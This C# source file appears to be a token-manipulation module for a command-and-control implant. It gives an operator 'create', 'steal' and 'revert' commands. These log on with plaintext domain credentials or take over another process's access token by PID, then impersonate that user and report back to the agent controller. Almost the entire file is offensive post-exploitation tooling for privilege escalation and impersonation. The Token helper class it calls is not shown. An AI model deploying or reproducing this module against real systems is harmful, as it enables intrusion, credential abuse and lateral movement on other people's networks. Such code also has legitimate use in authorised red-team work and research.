using System.Collections.Generic;
using System.Diagnostics;
using System.Text;

class TokenModule : IAgentModule
{
    AgentController Agent;
    ConfigController Config;

    public void Init(AgentController agent, ConfigController config)
    {
        Agent = agent;
        Config = config;
    }

    public AgentModuleInfo GetModuleInfo()
    {
        return new AgentModuleInfo
        {
            Name = "token",
            Description = "Token Magic",
            Developers = new List<Developer>
                {
                    new Developer { Name = "Daniel Duggan", Handle = "@_RastaMouse" },
                    new Developer { Name = "Adam Chester", Handle = "@_xpn_" }
                },
            Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "create",
                        Description = "Create a token with plaintext credentials",
                        HelpText = "token create [DOMAIN\\user] [password]",
                        CallBack = CreateToken
                    },
                    new AgentCommand
                    {
                        Name = "revert",
                        Description = "Revert to your original token",
                        HelpText = "token revert",
                        CallBack = Rev2Self
                    },
                    new AgentCommand
                    {
                        Name = "steal",
                        Description = "Steal an access token from a process",
                        HelpText = "token steal [pid]",
                        CallBack = StealToken
                    }
                }
        };
    }

    private void StealToken(byte[] data)
    {
        if (!int.TryParse(Encoding.UTF8.GetString(data), out int pid))
        {
            Agent.SendError("Not a valid PID");
            return;
        }

        Process process;

        try
        {
            process = Process.GetProcessById(pid);
        }
        catch
        {
            Agent.SendError($"PID: {pid} does not exist");
            return;
        }

        if (Token.StealToken(pid))
        {
            Agent.SendOutput($"Successfully impersonated token for {process.ProcessName}");
        }
        else
        {
            Agent.SendError($"Failed to impersonate token for {process.ProcessName}");
        }
    }

    private void Rev2Self(byte[] data)
    {
        if (Token.Rev2Self())
        {
            Agent.SendOutput("Token reverted");
        }
        else
        {
            Agent.SendError("Failed to revert token");
        }
    }

    private void CreateToken(byte[] data)
    {
        var split = Encoding.UTF8.GetString(data).Split(' ');

        var userdom = split[0].Split('\\');
        var domain = userdom[0];
        var user = userdom[1];
        var pass = split[1];

        if (Token.CreateToken(user, domain, pass))
        {
            Agent.SendOutput($"Successfully created and impersonated token for {userdom}");
        }
        else
        {
            Agent.SendError($"Unable to create and impersonate token for {userdom}");
        }
    }
}